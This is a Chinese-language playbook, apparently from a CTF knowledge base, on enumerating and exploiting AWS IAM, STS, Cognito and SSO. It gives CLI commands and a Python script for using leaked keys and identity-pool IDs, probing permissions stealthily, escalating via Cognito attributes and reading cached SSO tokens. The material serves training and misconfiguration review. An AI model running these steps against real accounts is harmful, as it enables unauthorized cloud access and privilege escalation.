---
category: cloud
tags: [aws, iam, sts, cognito, identity_pool, user_pool, assume_role, privilege_escalation, credential_leak, federation, oidc, saml, sso, identity_center, 身份枚举, 权限提升, 凭证利用, 临时凭证, 联邦身份]
triggers: [aws iam, iam enum, iam user, iam role, iam policy, iam group, assume role, sts, get-caller-identity, cognito, identity pool, user pool, cognito identity, cognito user, aws credential, aws key, access key, secret key, session token, federation, oidc provider, saml provider, sso, identity center, permission boundary, inline policy, managed policy, 权限枚举, 身份枚举, 临时凭证, 角色假设, 凭证泄露]
related: [cloud/aws_lambda_enum, cloud/aws_s3_enumeration, cloud/aws_api_gateway_recon]
---

# AWS IAM / STS / Cognito 身份枚举与利用

## 什么时候用

题目中出现 `AWS 凭证`、`access key`、`secret key`、`iam`、`sts`、`assume-role`、`cognito`、`identity pool`、`user pool`、`session token`、`federation`、`SAML`、`OIDC`、`SSO` 等线索时，应立即围绕 **"我是谁 → 我有什么权限 → 我能变成谁"** 这条链路展开。

常见场景：
- 拿到一组泄露的 AWS Access Key / Secret Key
- 在源码或环境变量中发现 Cognito User Pool ID / Identity Pool ID / Client ID
- 题目涉及 IAM 策略审计或角色信任关系
- 发现 SAML/OIDC 联邦身份配置

## 前提条件

- **最小要求**：至少拿到一个凭证线索（Access Key 对、Session Token、Cognito Pool ID、角色 ARN）
- **IAM 枚举**：需要 `iam:List*` / `iam:Get*` 类权限，或能做暴力探测
- **STS 操作**：目标角色的信任策略必须允许你的身份 AssumeRole
- **Cognito 未授权访问**：只需 Identity Pool ID（通常硬编码在前端 JS 中）

## 攻击步骤

### 1. 确认当前身份（我是谁）

拿到任何 AWS 凭证后，第一步永远是：

```bash
aws sts get-caller-identity
aws sts get-access-key-info --access-key-id <AccessKeyID>
```

返回值包含 Account ID、ARN、UserId，是后续所有操作的起点。

### 2. IAM 枚举（用户/组/角色/策略）

#### 2.1 全量快照

```bash
aws iam get-account-authorization-details
```

这条命令返回账户内所有用户、组、角色、策略及其关系，是信息量最大的单条命令。

#### 2.2 分类枚举

**用户**：

```bash
aws iam list-users
aws iam get-user --user-name <username>
aws iam list-access-keys --user-name <username>
aws iam list-user-policies --user-name <username>          # inline
aws iam get-user-policy --user-name <username> --policy-name <name>
aws iam list-attached-user-policies --user-name <username> # managed
aws iam list-groups-for-user --user-name <username>
aws iam list-mfa-devices --user-name <username>
aws iam list-ssh-public-keys --user-name <username>
aws iam list-service-specific-credentials --user-name <username>
```

**组**：

```bash
aws iam list-groups
aws iam get-group --group-name <name>
aws iam list-group-policies --group-name <name>
aws iam get-group-policy --group-name <name> --policy-name <policy>
aws iam list-attached-group-policies --group-name <name>
```

**角色**：

```bash
aws iam list-roles
aws iam get-role --role-name <name>
aws iam list-role-policies --role-name <name>
aws iam get-role-policy --role-name <name> --policy-name <policy>
aws iam list-attached-role-policies --role-name <name>
```

**策略**：

```bash
aws iam list-policies [--only-attached] [--scope Local]
aws iam get-policy --policy-arn <arn>
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <v>
aws iam list-policies-granting-service-access --arn <identity_arn> --service-namespaces <svc>
```

**身份提供商**：

```bash
aws iam list-saml-providers
aws iam get-saml-provider --saml-provider-arn <ARN>
aws iam list-open-id-connect-providers
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
```

**密码策略和 MFA**：

```bash
aws iam get-account-password-policy
aws iam list-virtual-mfa-devices
```

#### 2.3 隐蔽权限确认（无 List 权限时）

当 `List*` 权限被阻断，可通过触发可预测的验证错误来确认写权限是否存在（AWS 在返回这些错误前仍会执行 IAM 授权检查）：

```bash
# 确认 iam:CreateUser（EntityAlreadyExistsException = 有权限）
aws iam create-user --user-name <existing_user>

# 确认 iam:CreateLoginProfile（PasswordPolicyViolationException = 有权限）
aws iam create-login-profile --user-name <target_user> --password lower --password-reset-required
```

⚠️ 这些操作会留 CloudTrail 记录（带 `errorCode`），但不会创建持久资源。

#### 2.4 权限暴力破解工具

当你完全不知道自己有什么权限时：

```bash
# bf-aws-permissions — 最简单，遍历所有 list/describe/get
bash bf-aws-permissions.sh -p default > /tmp/bf-perms.txt

# enumerate-iam — 同样暴力枚举，用法略有不同
python3 enumerate-iam.py --access-key <AK> --secret-key <SK> [--session-token <ST>]

# bf-aws-perms-simulate — 基于 iam:SimulatePrincipalPolicy
python3 aws_permissions_checker.py --profile <profile> [--arn <arn>]

# weirdAAL — 检查常见服务的操作权限
python3 weirdAAL.py -m recon_all -t MyTarget
```

**从已知权限反推 Managed Policy**：

```bash
# aws-Perms2ManagedPolicies
python3 aws-Perms2ManagedPolicies.py --profile <profile> --permissions-file perms.txt
```

**从 CloudTrail 日志反推权限**：

```bash
python3 cloudtrail2IAM.py --prefix <prefix> --bucket_name <bucket> --profile <profile>
```

### 3. STS AssumeRole（角色切换）

#### 3.1 基本用法

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::<account>:role/<role-name> \
  --role-session-name <session-name>
```

返回临时的 Access Key、Secret Key、Session Token。

#### 3.2 信任策略逻辑

**同账户 — 角色信任特定角色 ARN**：
```json
{
  "Principal": { "AWS": "arn:aws:iam::<acc>:role/priv-role" },
  "Action": "sts:AssumeRole"
}
```
此时 `priv-role` **不需要**额外的 `sts:AssumeRole` 权限。

**同账户 — 角色信任整个账户（root）**：
```json
{
  "Principal": { "AWS": "arn:aws:iam::<acc>:root" },
  "Action": "sts:AssumeRole"
}
```
此时调用方**必须**在自己的 IAM 策略中有 `sts:AssumeRole` 权限。

**跨账户**：
无论信任策略写的是 ARN 还是 account，调用方**始终**需要 `sts:AssumeRole` 权限。

#### 3.3 会话 Token

```bash
aws sts get-session-token
aws sts get-session-token --serial-number <mfa_arn> --token-code <otp>
```

### 4. 联邦身份滥用

#### 4.1 OIDC — GitHub Actions

如果发现 OIDC Provider `token.actions.githubusercontent.com`，检查信任策略中的 `Condition`：

```json
{
  "Principal": { "Federated": "arn:aws:iam::<acc>:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:sub": "repo:ORG/REPO:ref:refs/heads/main"
    }
  }
}
```

攻击向量：如果 `Condition` 过于宽松（只限 org 不限 repo/branch），任何该 org 下的 workflow 都能拿到角色凭证。

#### 4.2 OIDC — EKS

```json
{
  "Principal": { "Federated": "arn:aws:iam::<acc>:oidc-provider/oidc.eks.<region>.amazonaws.com/id/<cluster_id>" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "oidc.eks.<region>.amazonaws.com/id/<cluster_id>:aud": "sts.amazonaws.com"
    }
  }
}
```

⚠️ 如果只校验 `:aud` 不校验 `:sub`（service account），则集群内**任何** pod 都能假设该角色。正确写法应额外限制：

```
"oidc.eks.<region>.amazonaws.com/id/<cluster_id>:sub": "system:serviceaccount:<ns>:<sa>"
```

### 5. Cognito Identity Pool（身份池）

#### 5.1 未授权获取 AWS 凭证

只需硬编码在前端的 Identity Pool ID（形如 `us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`）：

```bash
# 获取 Identity ID
aws cognito-identity get-id --identity-pool-id <pool_id> --no-sign

# 获取 AWS 临时凭证
aws cognito-identity get-credentials-for-identity --identity-id <id> --no-sign
```

Python 版本（更灵活）：

```python
import requests

region = "us-east-1"
pool_id = "us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
url = f"https://cognito-identity.{region}.amazonaws.com/"
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId",
           "Content-Type": "application/x-amz-json-1.1"}

r = requests.post(url, json={"IdentityPoolId": pool_id}, headers=headers)
identity_id = r.json()["IdentityId"]

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json={"IdentityId": identity_id}, headers=headers)
print(r.json())  # AccessKeyId, SecretKey, SessionToken
```

#### 5.2 Enhanced vs Basic 认证流绕过

默认 Enhanced 流会附加限制性 session policy。如果 Identity Pool 启用了 **Basic (Classic) Flow**，可以绕过该限制：

```bash
aws cognito-identity get-id --identity-pool-id <pool_id> --no-sign
aws cognito-identity get-open-id-token --identity-id <id> --no-sign
aws sts assume-role-with-web-identity \
  --role-arn "arn:aws:iam::<acc>:role/<role>" \
  --role-session-name s --web-identity-token <token> --no-sign
```

如果报 `Basic (classic) flow is not enabled`，说明只有 Enhanced 流可用。

#### 5.3 已认证用户获取更高权限

通过 Cognito User Pool 登录后，用 ID Token 获取已认证角色的凭证：

```bash
aws cognito-identity get-id \
  --identity-pool-id <pool_id> \
  --logins '{"cognito-idp.<region>.amazonaws.com/<user_pool_id>": "<ID_TOKEN>"}'

aws cognito-identity get-credentials-for-identity \
  --identity-id <id> \
  --logins '{"cognito-idp.<region>.amazonaws.com/<user_pool_id>": "<ID_TOKEN>"}'

# 如果 IdToken 包含多个角色，指定角色
aws cognito-identity get-credentials-for-identity \
  --identity-id <id> \
  --custom-role-arn <role_arn> \
  --logins '{"cognito-idp.<region>.amazonaws.com/<user_pool_id>": "<ID_TOKEN>"}'
```

### 6. Cognito User Pool（用户池）

#### 6.1 注册 + 用户枚举

```bash
# 注册（默认开放）
aws cognito-idp sign-up --client-id <client_id> \
  --username <user> --password <pwd> \
  --region <region> --no-sign-request

# 提供额外属性
aws cognito-idp sign-up --client-id <client_id> \
  --username <user> --password <pwd> \
  --user-attributes '[{"Name":"email","Value":"a@b.com"}]' \
  --region <region> --no-sign-request

# 确认注册
aws cognito-idp confirm-sign-up --client-id <client_id> \
  --username <user> --confirmation-code <code> \
  --no-sign-request --region <region>
```

- `UsernameExistsException` → 该用户名已存在（用户枚举）
- `NotAuthorizedException: SignUp is not permitted` → 仅管理员可创建用户

#### 6.2 认证方式

| 认证流 | 特点 | 前提 |
|--------|------|------|
| `USER_SRP_AUTH` | 默认启用，密码不过网络 | client_id, pool_id, 用户名密码 |
| `USER_PASSWORD_AUTH` | 明文密码，需手动启用 | client_id, 用户名密码 |
| `ADMIN_USER_PASSWORD_AUTH` | 服务端流，需 AWS 凭证 | pool_id, client_id, 用户名密码, AWS 凭证 |
| `REFRESH_TOKEN_AUTH` | 始终可用 | 有效的 refresh token |
| `CUSTOM_AUTH` | Lambda 驱动的自定义认证 | 取决于 Lambda 实现 |

```bash
# USER_PASSWORD_AUTH 登录
aws cognito-idp initiate-auth --client-id <client_id> \
  --auth-flow USER_PASSWORD_AUTH \
  --auth-parameters 'USERNAME=<user>,PASSWORD=<pwd>' \
  --region <region>

# 刷新 Token
aws cognito-idp initiate-auth --client-id <client_id> \
  --auth-flow REFRESH_TOKEN_AUTH \
  --auth-parameters 'REFRESH_TOKEN=<token>' \
  --region <region>
```

#### 6.3 属性修改提权

```bash
# 修改自身属性
aws cognito-idp update-user-attributes \
  --user-attributes Name=<attr>,Value=<val> \
  --access-token <token> \
  --region <region> --no-sign-request
```

提权向量：
- **自定义属性** `isAdmin`、`role` 等可被用户自行修改 → 直接提权
- **修改 email** → 接管其他用户（需验证，但 email_verified=false 时某些应用不校验）
- **修改 name 属性** → 如果应用用 `name` 而非 `email` 做身份判断，可冒充

#### 6.4 密码重置

```bash
aws cognito-idp forgot-password --client-id <client_id> \
  --username <user> --region <region>

aws cognito-idp confirm-forgot-password --client-id <client_id> \
  --username <user> --confirmation-code <code> \
  --password <new_pwd> --region <region>
```

### 7. IAM Identity Center / SSO

```bash
# 检查是否启用
aws sso-admin list-instances

# 枚举 Permission Sets
aws sso-admin list-permission-sets --instance-arn <arn>
aws sso-admin describe-permission-set --instance-arn <arn> --permission-set-arn <ps_arn>

# Permission Set 的策略
aws sso-admin list-managed-policies-in-permission-set --instance-arn <arn> --permission-set-arn <ps>
aws sso-admin get-inline-policy-for-permission-set --instance-arn <arn> --permission-set-arn <ps>

# Identity Store 用户/组
aws identitystore list-users --identity-store-id <store_id>
aws identitystore list-groups --identity-store-id <store_id>
aws identitystore list-group-memberships --identity-store-id <store_id> --group-id <gid>
```

本地 SSO 缓存凭证位置：
- `$HOME/.aws/sso/cache` — SSO 登录后的 token 缓存
- `$HOME/.aws/cli/cache` — assume-role 的凭证缓存

## 常见坑

- **`sts get-caller-identity` 永远优先** — 不确认身份就盲目枚举，浪费时间且容易暴露
- **inline vs attached vs managed 三种策略都要查** — 只查 attached 会漏掉 inline 和 customer managed
- **AssumeRole 的双向校验** — 目标角色信任你 ≠ 你就能切过去，你可能还需要自身策略里有 `sts:AssumeRole`
- **Cognito Enhanced Flow 的 session policy 限制** — 拿到凭证发现权限比预期少，很可能是 Enhanced Flow 的 scope-down 限制
- **User Pool 的 `email_verified` 字段** — 改了 email 后 IdToken 里 email 会变但 verified=false，有些应用不校验
- **自定义属性名以 `custom:` 开头** — 枚举 Cognito 属性时别忘了这个前缀
- **OIDC 信任策略的 Condition 粒度** — 只校验 `:aud` 不校验 `:sub` 是常见配置错误
- **Terraform .tfstate / CloudFormation 模板** — 可能泄露完整的 IAM 配置，找到后优先分析

## 变体

- **纯 IAM 枚举** — 只有 Access Key，从 `get-caller-identity` 开始逐步展开
- **Cognito 未授权** — 前端泄露 Identity Pool ID，获取 unauth 角色凭证
- **Cognito 用户池提权** — 注册用户后修改自定义属性（如 isAdmin）
- **STS 角色链** — AssumeRole → AssumeRole，跨账户跳板
- **联邦身份滥用** — 利用宽松的 OIDC/SAML 信任策略获取角色凭证
- **SSO 凭证窃取** — 从本地缓存 `~/.aws/sso/cache` 读取 token
- **CloudTrail / .tfstate 信息泄露** — 间接获取 IAM 配置全景

## 相关技术

- [[cloud/aws_lambda_enum]] — Lambda 函数枚举，拿到 IAM 凭证后常用于调用 Lambda 或分析其执行角色
- [[cloud/aws_s3_enumeration]] — S3 是最常见的权限验证目标，也是配置文件和凭证泄露的高频位置
- [[cloud/aws_api_gateway_recon]] — API Gateway 和 IAM 授权器紧密关联，枚举路由后可能发现需要 IAM 签名的端点
